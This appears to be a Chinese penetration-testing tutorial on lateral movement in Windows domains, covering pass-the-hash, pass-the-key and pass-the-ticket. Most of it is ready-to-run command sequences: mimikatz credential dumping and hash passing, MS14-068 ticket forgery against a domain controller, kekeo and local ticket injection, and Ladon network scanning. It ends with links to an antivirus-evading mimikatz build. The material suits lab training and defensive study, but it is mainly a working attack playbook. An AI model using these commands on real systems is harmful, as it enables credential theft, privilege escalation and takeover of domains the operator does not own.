# 思维导图

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/68-0.png)



![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/68-1.png)





# 知识点

## Kerberos 协议

具体工作方法，在域中，简要介绍一下：

- 客户机将明文密码进行 NTLM 哈希,然后和时间戳一起加密(使用krbtgt 密码 hash 作为密钥)，发送给 kdc（域控），kdc 对用户进行检测，成功之后创建 TGT(Ticket-Granting Ticket)
- 将 TGT 进行加密签名返回给客户机器，只有域用户 krbtgt 才能读
  取 kerberos 中 TGT 数据
- 然后客户机将 TGT 发送给域控制器 KDC 请求 TGS（票证授权服务）票证，并且对 TGT 进行检测。
-  检测成功之后，将目标服务账户的 NTLM 以及 TGT 进行加密，将
  加密后的结果返回给客户机。

## PTH

**PTH**(pass the hash) 利用 lm 或 ntlm 的值进行的渗透测试。

PTH 在内网渗透中是一种很经典的攻击方式，原理就是攻击者可以直接通过 LM Hash 和 NTLM Hash 访问远程主机或服务，而不用提供明文密码。

如果禁用了 ntlm 认证，PsExec 无法利用获得的 ntlm hash 进行远程连接，但是使用 mimikatz 还是可以攻击成功。

对于 8.1/2012r2，安装补丁 kb2871997 的 Win 7/2008r2/8/2012 等，可以使用 AES keys 代替 NT hash 来实现 ptk 攻击。

### 总结：KB2871997 补丁后的影响

pth：没打补丁用户都可以连接，打了补丁只能 administrator 连接
ptk：打了补丁才能用户都可以连接，采用 aes256 连接
https://www.freebuf.com/column/220740.html

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/68-2.png)

## PTK

**PTK**(pass the key) 利用的 ekeys aes256 进行的渗透测试

## PTT

**PTT**(pass the ticket) 利用票据凭证 TGT 进行的渗透测试。

PTT 攻击的部分就不是简单的 NTLM 认证了，它是利用 Kerberos 协议进行攻击的，这里就介绍三种常见的攻击方法：

- MS14-068
- Golden ticket
- SILVER ticket

简单来说就是将连接合法的票据注入到内存中实现连接。
MS14-068 基于漏洞，Golden ticket(黄金票据)，SILVER ticket(白银票据)其中 Golden ticket(黄金票据)，SILVER ticket(白银票据)属于权限维持技术。
MS14-068 造成的危害是允许域内任何一个普通用户，将自己提升至域管权限。微软给出的补丁是kb3011780

# 演示案例：

## 域横向移动 PTH 传递-Mimikatz

### 案例 1-域横向移动 PTH 传递-mimikatz

PTH ntlm 传递 未打补丁下的工作组及域连接

```shell
#域连接
sekurlsa::pth /user:administrator /domain:god /ntlm:ccef208c6485269c20db2cad21734fe7
#工作组连接
sekurlsa::pth /user:administrator /domain:workgroup/ntlm:518b98ad4178a53695dc997aa02d455c
#在实战中，本地用户与域用户，都尝试连接一下
sekurlsa::pth /user:boss /domain:god /ntlm:ccef208c6485269c20db2cad21734fe7
\\OWA2010CN-God.god.org
privilege::debug
sekurlsa::logonpasswords
```

当获取到域内一个主机的权限之后，可以使用mimikatz运行sekurlsa::logonPasswords命令获取其LM和NTLM。

注意：Windows系统LM Hash及NTLM Hash加密算法，个人系统在Windows vista后，服务器系统在Windows 2003以后，认证方式均为NTLM Hash。由于目前大部分主机系统都很新，所以一般我们收集的都是NTLM数据，但是也不排除内网中有老系统，所以在信息收集的时候，**最好LM和NTLM都收集一下。**

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/68-3.png)

```shell
LM       :e90127c07127ed12f4ebf668acca53e9
NTLM     :518b98ad4178a53695dc997aa02d455c
```

当收集到NTLM数据后，很有可能内网中有其他主机的NTLM值与我们收集到的一致。此时我们就可以使用NTLM进行内网横向渗透。

运行以下命令，域横向移动PTH传递，攻击未打补丁下域内主机，其中ccef208c6485269c20db2cad21734fe7是前期信息收集时收集到的NTLM值。

```shell
sekurlsa::pth /user:administrator /domain:god /ntlm:ccef208c6485269c20db2cad21734fe7
sekurlsa::pth/user:administrator /domain:workgroup/ntlm:518b98ad4178a53695dc997aa02d455c
```

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/68-4.png)



弹出一个新的cmd框，只要弹出框，就说明这个域内主机与我们收集到的NTLM值相同。接下来我们就可以进行at schtasks 复制文件、执行文件等其他操作了。

```shell
dir \\OWA2010CN-God.god.org\c$
dir \\192.168.3.21\c$
```



![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/68-5.png)



## 域横向移动 PTK 传递-Mimikatz

PTK aes256传递 - 打补丁后的工作组及域连接：
因为PTK传递需要一个前提条件，主机必须打了补丁kb2871997。
在实际上，PTK传递比PTH传递用的少。

```shell
sekurlsa::ekeys 获取aes256值
sekurlsa::pth /user:mary /domain:god /aes256:d7c1d9310753a2f7f240e5b2701dc1e6177d16a6e40af3c5cdff814719821c4b
```

获取aes256值

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/68-6.png)

PTK传递（这里使用的是本机的aes256，仅做操作演示）

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/68-7.png)

## 域横向移动 PTT 传递-MS14068&kekeo&local

### 案例 3-域横向移动 PTT 传递-ms14068&kekeo&本地

#### 第一种利用漏洞：

MS14-068 powershell 执行，能实现普通用户直接获取域控 system 权限

- MS14-068下载：https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068

1. `whoami/user` 查看当前 sid 

```
 S-1-5-21-1218902331-2157346161-1782232778-1124
```

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/68-8.png)

mary就是域内一个普通用户

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/68-9.png)

2.清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造

```shell
 klist //查看当前机器凭证
 klist purge//清空当前机器中所有凭证
```

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/68-10.png)



3.利用 ms14-068 生成 TGT 数据

```shell
ms14-068.exe -u 域成员名@域名 -s sid -d 域控制器地址 -p 域成员密码
.\MS14-068.exe -u mary@god.org -s S-1-5-21-1218902331-2157346161-1782232778-1124 -d 192.168.3.21 -p admin!@#45
```

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/68-11.png)

4.票据注入内存

```shell
./mimikatz.exe 
kerberos::ptc TGT_mary@god.org.ccache
exit
```

5.查看凭证列表 klist

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/68-12.png)

6.利用

```shell
dir \\192.168.3.21\c$
dir \\OWA2010CN-God.god.org\c$
```

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/68-13.png)

#### 第二种利用工具 kekeo

- 工具kekeo下载：https://github.com/gentilkiwi/kekeo/releases

1.生成票据

```shell
kekeo "tgt::ask /user:mary /domain:god.org /ntlm:518b98ad4178a53695dc997aa02d455c"
```

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/68-14.png)

2.导入票据

```shell
kerberos::ptt TGT_mary@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi
```

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/68-15.png)

3.查看凭证 klist

![68-16](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/68-16.png)

4.利用

```shell
dir \\192.168.3.21\c$
```



#### 第三种利用本地票据(需管理权限)

因为当前主机肯定之前与其他主机连接过，所以本地应该生成了一些票据，我们可以导出这些票据，然后再导入票据，利用。该方法类似于cookie欺骗。

缺点：票据是有有效期的，一般为10小时，所以如果当前主机10h之内连接过域控的话，我们可以利用该票据，但是如果超过10h，就没法利用。

导出本地票据(需管理权限)到当前目录

```
sekurlsa::tickets /export
```

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/68-17.png)

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/68-18.png)

导入票据

```shell
kerberos::ptt xxxxxxxxxx.xxxx.kirbi
```

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/68-19.png)

![68-20](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/68-20.png)



利用票据

总结：ptt 传递**不需本地管理员权限**，连接时**主机名连接**，基于漏洞,工具,本地票据



## 国产 Ladon 内网杀器测试验收-信息收集,连接等

信息收集-协议扫描-漏洞探针-传递攻击等

github：[Release Ladon 911 ](https://github.com/k8gege/Ladon/releases/tag/v911)

官网：http://k8gege.org/Ladon/

具体用法请查看官网wiki，举例如下

```
Ladon.exe 192.168.1.8/24 OnlinePC 扫当前机器所处C段的存活主机，其它模块同理
Ladon.exe 192.168.1.8/24 OsScan 扫当前机器所处C段操作系统版本，其它模块同理
Ladon.exe 192.168.1.8/24 MysqlScan 扫当前机器所处C段的ssh端口，其它模块同理
Ladon 192.168.1.8/24 MS17010 扫当前机器所处C段的永恒之蓝漏洞，其它模块同理
参考：https://www.cnblogs.com/zpchcbd/p/11944486.html
```

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/68-21.png)

![68-22](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/68-22.png)

# 涉及资源：

https://github.com/gentilkiwi/kekeo/

[k8gege/Ladon: 大型内网渗透扫描器](https://github.com/k8gege/Ladon/releases)

解压密码：k8gege.org

https://github.com/ianxtianxt/MS14-068/blob/master/MS14-068.exe

暗月免杀mimikatz

链接：https://pan.baidu.com/s/1erHWNWQ6roVWTKNkdWsffg?pwd=uy5q 
提取码：uy5q

# 参考

https://www.cnblogs.com/zhengna/p/15320256.html

